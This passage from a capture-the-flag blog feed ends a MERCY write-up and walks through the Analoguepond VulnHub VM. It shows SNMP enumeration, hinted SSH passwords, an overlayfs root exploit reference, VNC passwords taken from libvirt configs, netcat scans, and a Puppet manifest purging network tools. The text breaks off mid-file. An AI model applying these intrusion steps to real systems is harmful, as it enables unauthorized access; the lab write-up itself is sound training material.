<p>Indeed, cron was running the timeclock script every 3 minutes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*/3 * * * * bash /home/fluffy/.private/secrets/timeclock</span></code></pre></td></tr></table></div></figure>


<p>And the final flag and a message from the author:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@MERCY:~# cat author-secret.txt
</span><span class='line'>cat author-secret.txt
</span><span class='line'>Hi! Congratulations on being able to root MERCY.
</span><span class='line'>
</span><span class='line'>The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.
</span><span class='line'>
</span><span class='line'>The author would also like to thank a great friend who he always teases as "plead for mercy". She has been awesome. The author, in particular, appreciates her great heart, candour, and her willingness to listen to the author's rants and troubles. The author will stay forever grateful for her presence. She never needed to be this friendly to the author.
</span><span class='line'>
</span><span class='line'>The author, as "plead for mercy" knows, is terrible at any sort of dedication or gifting, and so the best the author could do, I guess, is a little present, which explains the hostname of this box. (You might also have been pleading for mercy trying to root this box, considering its design.)
</span><span class='line'>
</span><span class='line'>You'll always be remembered, "plead for mercy", and Offensive Security, for making me plead for mercy!
</span><span class='line'>
</span><span class='line'>Congratulations, once again, for you TRIED HARDER!
</span><span class='line'>
</span><span class='line'>Regards,
</span><span class='line'>The Author</span></code></pre></td></tr></table></div></figure>


<p>This was a nice box, the RIPS vector was definitely an interesting touch!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_________________________________________
</span><span class='line'>/ If your life was a horse, you'd have to \
</span><span class='line'>\ shoot it.                               /
</span><span class='line'>-----------------------------------------
</span><span class='line'>           \   ^__^
</span><span class='line'>              \  (oo)\_______
</span><span class='line'>                   (__)\       )\/\
</span><span class='line'>                           ||----w |
</span><span class='line'>                           ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pond. Analoguepond]]></title>
    <link href="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/"/>
    <updated>2019-05-30T21:45:50+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/05/30/pond-analoguepond</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM should be fun, since it&rsquo;s from knightmare, so we should expect lots of references! I&rsquo;m also not sure about the actual name of the box, if it&rsquo;s Analougepond or Analoguepond. A promising start =D</p>

<blockquote><p>Remember TCP is not the only protocol on the Internet My challenges are never finished with root. I make you work for the flags. The intended
route is NOT to use forensics or 0-days, I will not complain either way.</p>

<p>To consider this VM complete, you need to have obtained:</p>

<p>   Troll Flag: where you normally look for them</p>

<p>   Flag 1: You have it when you book Jennifer tickets to Paris on Pan Am.</p>

<p>   Flag 2: It will include a final challenge to confirm you hit the jackpot.</p>

<p>   Have root everywhere (this will make sense once you&rsquo;re in the VM)</p>

<p>   User passwords</p>

<p>   2 VNC passwords</p>

<p>Best of luck! If you get stuck, eat some EXTRABACON</p>

<p>NB: Please allow 5-10 minutes or so from powering on the VM for background tasks to run before proceeding to attack.</p></blockquote>

<!-- more -->


<p>For the recon part, today I&rsquo;ll be using <a href="https://github.com/codingo/Reconnoitre">Reconnoitre</a></p>

<blockquote><p>A reconnaissance tool made for the OSCP labs to automate information gathering and service enumeration whilst creating a directory structure to store results, findings and exploits used for > each host, recommended commands to execute and directory structures for storing loot and flags.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>reconnoitre -h
</span><span class='line'>usage: reconnoitre [-h] -t TARGET_HOSTS -o OUTPUT_DIRECTORY [-w WORDLIST]
</span><span class='line'>                   [-p PORT] [--pingsweep] [--dns] [--services] [--hostnames]
</span><span class='line'>                   [--snmp] [--quick] [--virtualhosts]
</span><span class='line'>                   [--ignore-http-codes IGNORE_HTTP_CODES]
</span><span class='line'>                   [--ignore-content-length IGNORE_CONTENT_LENGTH] [--quiet]
</span><span class='line'>                   [--no-udp]
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help            show this help message and exit
</span><span class='line'>  -t TARGET_HOSTS       Set a target range of addresses to target. Ex
</span><span class='line'>                        10.11.1.1-255
</span><span class='line'>  -o OUTPUT_DIRECTORY   Set the output directory. Ex /root/Documents/labs/
</span><span class='line'>  -w WORDLIST           Set the wordlist to use for generated commands. Ex
</span><span class='line'>                        /usr/share/wordlist.txt
</span><span class='line'>  -p PORT               Set the port to use. Leave blank to use discovered
</span><span class='line'>                        ports. Useful to force virtual host scanning on non-
</span><span class='line'>                        standard webserver ports.
</span><span class='line'>  --pingsweep           Write a new target.txt by performing a ping sweep and
</span><span class='line'>                        discovering live hosts.
</span><span class='line'>  --dns, --dnssweep     Find DNS servers from a list of targets.
</span><span class='line'>  --services            Perform service scan over targets.
</span><span class='line'>  --hostnames           Attempt to discover target hostnames and write to
</span><span class='line'>                        0-name.txt and hostnames.txt.
</span><span class='line'>  --snmp                Perform service scan over targets.
</span><span class='line'>  --quick               Move to the next target after performing a quick scan
</span><span class='line'>                        and writing first-round recommendations.
</span><span class='line'>  --virtualhosts        Attempt to discover virtual hosts using the specified
</span><span class='line'>                        wordlist.
</span><span class='line'>  --ignore-http-codes IGNORE_HTTP_CODES
</span><span class='line'>                        Comma separated list of http codes to ignore with
</span><span class='line'>                        virtual host scans.
</span><span class='line'>  --ignore-content-length IGNORE_CONTENT_LENGTH
</span><span class='line'>                        Ignore content lengths of specificed amount. This may
</span><span class='line'>                        become useful when a server returns a static page on
</span><span class='line'>                        every virtual host guess.
</span><span class='line'>  --quiet               Supress banner and headers to limit to comma dilimeted
</span><span class='line'>                        results only.
</span><span class='line'>  --no-udp              Disable UDP services scan over targets.</span></code></pre></td></tr></table></div></figure>


<p>I ran reconnoitre and it created a directory structure with multiple files:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>reconnoitre -t 192.168.159.136 --services -o .
</span><span class='line'>  __
</span><span class='line'>|\"\"\"\-=  RECONNOITRE
</span><span class='line'>(____)      An OSCP scanner by @codingo_
</span><span class='line'>
</span><span class='line'>[+] Testing for required utilities on your system.
</span><span class='line'>[#] Performing service scans
</span><span class='line'>[*] Loaded single target: 192.168.159.136
</span><span class='line'>[+] Creating directory structure for 192.168.159.136
</span><span class='line'>   [&gt;] Creating scans directory at: ./192.168.159.136/scans
</span><span class='line'>   [&gt;] Creating exploit directory at: ./192.168.159.136/exploit
</span><span class='line'>   [&gt;] Creating loot directory at: ./192.168.159.136/loot
</span><span class='line'>   [&gt;] Creating proof file at: ./192.168.159.136/proof.txt
</span><span class='line'>[+] Starting quick nmap scan for 192.168.159.136
</span><span class='line'>[+] Writing findings for 192.168.159.136
</span><span class='line'>[*] Found SSH service on 192.168.159.136:22
</span><span class='line'>[*] TCP quick scans completed for 192.168.159.136
</span><span class='line'>[+] Starting detailed TCP/UDP nmap scans for 192.168.159.136
</span><span class='line'>[+] Writing findings for 192.168.159.136
</span><span class='line'>[*] Found SSH service on 192.168.159.136:22
</span><span class='line'>[*] TCP/UDP scans completed for 192.168.159.136</span></code></pre></td></tr></table></div></figure>


<p>The files contain the commands that were run and the output, along with recommendations. The scans revealed that SSH and SNMP are open on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
</span><span class='line'>| snmp-info:
</span><span class='line'>|   enterprise: net-snmp
</span><span class='line'>|   engineIDFormat: unknown
</span><span class='line'>|   engineIDData: 096a5051642b555800000000
</span><span class='line'>|   snmpEngineBoots: 19
</span><span class='line'>|_  snmpEngineTime: 3h58m00s
</span><span class='line'>| snmp-sysdescr: Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
</span><span class='line'>|_  System uptime: 3h58m0.20s (1428020 timeticks)
</span><span class='line'>Service Info: Host: analoguepond</span></code></pre></td></tr></table></div></figure>


<p>Next I enumerated the SNMP information:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>snmp-check 192.168.159.136
</span><span class='line'>snmp-check v1.9 - SNMP enumerator
</span><span class='line'>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
</span><span class='line'>
</span><span class='line'>[+] Try to connect to 192.168.159.136:161 using SNMPv1 and community 'public'
</span><span class='line'>
</span><span class='line'>[*] System information:
</span><span class='line'>
</span><span class='line'>  Host IP address               : 192.168.159.136
</span><span class='line'>  Hostname                      : analoguepond
</span><span class='line'>  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
</span><span class='line'>  Contact                       : Eric Burdon &lt;eric@example.com&gt;
</span><span class='line'>  Location                      : There is a house in New Orleans they call it...
</span><span class='line'>  Uptime snmp                   : 05:15:30.80
</span><span class='line'>  Uptime system                 : 05:15:20.10
</span><span class='line'>  System date                   : 2019-5-23 15:39:09.0</span></code></pre></td></tr></table></div></figure>


<p>We have a possible user account called <em>eric</em>. I googled the line about New Orleans and found it&rsquo;s from a song:</p>

<blockquote><p>There is a house in New Orleans
They call the rising sun</p></blockquote>

<p>The credentials <code>eric/therisingsun</code> worked for SSH. In the home directory I found a funny image that may be useful for something later:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/analoguepond/reticulatingsplines.gif" title="reticulatingsplines" alt="reticulatingsplines"></p>

<p>I ran LinEnum on the box and noticed some VMs running on it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[-] ARP history:
</span><span class='line'>barringsbank.example.com (192.168.122.3) at 52:54:00:6d:93:6a [ether] on virbr0
</span><span class='line'>? (192.168.159.129) at 00:0c:29:9c:6f:0f [ether] on eth0
</span><span class='line'>puppet.example.com (192.168.122.2) at 52:54:00:5b:05:f7 [ether] on virbr0
</span><span class='line'>? (192.168.159.1) at 00:50:56:c0:00:01 [ether] on eth0</span></code></pre></td></tr></table></div></figure>


<h2>Troll flag</h2>

<p>The OS running is Ubuntu 14.04.5 LTS, so it&rsquo;s vulnerable to the <a href="https://www.exploit-db.com/exploits/39166">overlayfs exploit</a>. With it, I got root easily, and read the first flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/root# cat flag.txt
</span><span class='line'>C'Mon Man! Y'all didn't think this was the final flag so soon...?
</span><span class='line'>
</span><span class='line'>Did the bright lights and big city knock you out...? If you pull
</span><span class='line'>a stunt like this again, I'll send you back to Walker...
</span><span class='line'>
</span><span class='line'>This is obviously troll flah #1 So keep going.</span></code></pre></td></tr></table></div></figure>


<h2>2 VNC passwords</h2>

<p>Ok, we have root, but this is only the beginning. We know that we should find 2 VNC passwords, and they are probably for the 2 VMs we identified earlier. I confirmed it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# netstat -antp | grep 5900
</span><span class='line'>tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1260/qemu-system-x8</span></code></pre></td></tr></table></div></figure>


<p>I searched for the VM configuration files, they were located in <code>/etc/libvirt/qemu</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# ls *.xml
</span><span class='line'>barringsbank.xml  puppet.xml</span></code></pre></td></tr></table></div></figure>


<p>I read the files and found the password for <strong>barringsbank</strong> is <code>memphistennessee</code>, while the password for <strong>puppet</strong> is <code>sendyoubacktowalker</code>. Since nc was installed on the box, I used it to port scan the VMs. They didn&rsquo;t have 5900 port open, but they did have SSH listening:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.3 22
</span><span class='line'>Connection to 192.168.122.3 22 port [tcp/ssh] succeeded!
</span><span class='line'>root@analoguepond:/etc/libvirt/qemu# nc -zv 192.168.122.2 22
</span><span class='line'>Connection to 192.168.122.2 22 port [tcp/ssh] succeeded!</span></code></pre></td></tr></table></div></figure>


<h2>Rooting puppet</h2>

<p>I tried to SSH on the puppet VM first, to see if I can get any info, and the banner did not disappoint:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.122.2
</span><span class='line'>+-----------------------------------------------------------------------------+
</span><span class='line'>| Passwords are very dated.. Removing spaces helps sandieshaw log in with her |
</span><span class='line'>| most famous song                                                            |
</span><span class='line'>+-----------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>


<p>We found out there&rsquo;s a sandieshaw user and got a hint for the password. After a little Googling, I learned that one of Sandie Shaw&rsquo;s most famous songs is Puppet on a String..and this suits the VM, so I removed the spaces and tried lowercase first, and got in with <code>sandieshaw/puppetonastring</code>.</p>

<p>This seems to be a Puppet-centric machine. Puppet is a tool for automating infrastructure and software configuration management. You can learn more from <a href="https://puppet.com/">https://puppet.com/</a></p>

<p>Back to the machine, I checked that Puppet is running:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:~/.puppet$ ps aux | grep puppet
</span><span class='line'>puppet    1020  0.9  5.1 315408 52728 ?        Ssl  09:21   0:46 /usr/bin/ruby /usr/bin/puppet master
</span><span class='line'>root      3408  0.5  0.0   4448   672 ?        Ss   10:40   0:00 /bin/sh -c /usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1
</span><span class='line'>root      3409 24.8  1.9  79220 20312 ?        Sl   10:40   0:04 /usr/bin/ruby /usr/bin/puppet agent --test</span></code></pre></td></tr></table></div></figure>


<p>Then I looked inside puppet&rsquo;s config directory, in <em>/etc/puppet</em>, and I found lots of configuration files for the barringsbank VM inside <code>modules/vulnhub/files/</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules/vulnhub/files$ ls
</span><span class='line'>barringsbank-group      barringsbank-passwd       hosts.deny    puppet-hosts.allow  puppet-sshd_config  sudoers
</span><span class='line'>barringsbank-hosts.allow  barringsbank-sshd_config  puppet-group  puppet-passwd       sshd_config   sudoers.d</span></code></pre></td></tr></table></div></figure>


<p>In the <em>barringsbank-passwd</em> file, I found the user list, the interesting one to keep in mind is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nleeson:x:1000:1000:Nicholas Leeson,,,:/home/nleeson:/bin/bash</span></code></pre></td></tr></table></div></figure>


<p>Continuing with the information gathering, the <em>barringsbank-sshd_config</em> reveals that public key authentication is used for SSH on the VM.</p>

<p>Inside <em>manifests</em> there&rsquo;s a module called <em>init.pp</em> that removes from the system the useful command line utilities lice nmap, ncaat, etc. and reverses changes to key system files. It&rsquo;s pretty funny and contains references to various Vulnhub users.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## Module to unwind changed #vulnhub people make.  This will unwind the most
</span><span class='line'>## common vectors they used to get at my other VMs
</span><span class='line'>
</span><span class='line'>class vulnhub {
</span><span class='line'>
</span><span class='line'>## purge packages they abuse too (hello mrB3n, GKNSB, Ch3rn0byl, mr_h4sh)
</span><span class='line'>$purge = [ "nano", "wget", "curl", "fetch","nmap", "netcat-traditional",
</span><span class='line'>           "ncat", "netdiscover", "lftp" ]
</span><span class='line'>  package { $purge:
</span><span class='line'>  ensure =&gt; purged,
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## The encryption is still primative Egyptian (Hello drweb)
</span><span class='line'>$theresas_nightmare = [ "cryptcat", "socat" ]
</span><span class='line'>  package { $theresas_nightmare:
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Adding to sudoers is a bit naughty so reverse that (most of #vulnhub)
</span><span class='line'>file { "/etc/sudoers.d":
</span><span class='line'>  ensure =&gt; "directory",
</span><span class='line'>  recurse =&gt; true,
</span><span class='line'>  purge   =&gt; true,
</span><span class='line'>  force   =&gt; true,
</span><span class='line'>  owner   =&gt; root,
</span><span class='line'>  group   =&gt; root,
</span><span class='line'>  mode    =&gt; 0755,
</span><span class='line'>  source  =&gt; "puppet:///modules/vulnhub/sudoers.d",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## revert /etc/passwd (Hey rfc, kevinnz!)
</span><span class='line'>file {'/etc/sudoers':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0440,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/sudoers",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## revert /etc/passwd (Hey Rasta_Mouse!)
</span><span class='line'>file {'/etc/passwd':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0644,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-passwd",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## and /etc/group (Hello to you cmaddy)
</span><span class='line'>file {'/etc/group':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0644,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-group",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Mr Potato Head! BACKDOORS ARE NOT SECRETS (Hey GKNSB!)
</span><span class='line'>file {'/etc/ssh/ssd_config':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0644,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-sshd_config",
</span><span class='line'>  notify =&gt; Service["ssh"],
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Leave US keyboard for those crazy yanks, and not to torture Ch3rn0byl like
</span><span class='line'>## Gibson
</span><span class='line'>cron { "puppet check in":
</span><span class='line'>  command =&gt; "/usr/bin/puppet agent --test &gt; /dev/null 2&gt;&1",
</span><span class='line'>  user =&gt; "root",
</span><span class='line'>  minute =&gt; "*/10",
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Everyone forbidden by default (Hey wrboyce, rasta_mouse, 8bitkiwi)
</span><span class='line'>file {'/etc/hosts.deny':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0644,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/hosts.deny",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Firewall off to only specific hosts (Hello Bas!)
</span><span class='line'>file {'/etc/hosts.allow':
</span><span class='line'>  ensure =&gt; present,
</span><span class='line'>  owner  =&gt; root,
</span><span class='line'>  group  =&gt; root,
</span><span class='line'>  mode   =&gt; 0644,
</span><span class='line'>  source =&gt; "puppet:///modules/vulnhub/${hostname}-hosts.allow",
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Don't fill up the disk (Hey GlobalMaquereau, g0bl1n)
</span><span class='line'>tidy { "/var/lib/puppet/reports":
</span><span class='line'>   age     =&gt; "1h",
</span><span class='line'>   recurse =&gt; true,
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>## Changing openssh config requires restart
</span><span class='line'>service { 'ssh':
</span><span class='line'>  ensure      =&gt; running,
</span><span class='line'>  enable      =&gt; true,
</span><span class='line'>  hasstatus   =&gt; true,
</span><span class='line'>  hasrestart  =&gt; true,
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Inside the <em>fiveeights</em> module there&rsquo;s another file referencing the contents of SSH authorized keys for the nleeson user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sandieshaw@puppet:/etc/puppet/modules$ cat fiveeights/manifests/init.pp
</span><span class='line'>## Nick's secret file hide the screw-ups
</span><span class='line'>class fiveeights {
</span><span class='line'>
</span><span class='line'>## private key held elsewhere. Keep looking
</span><span class='line'>  file { '/home/nleeson/.ssh/authorized_keys':
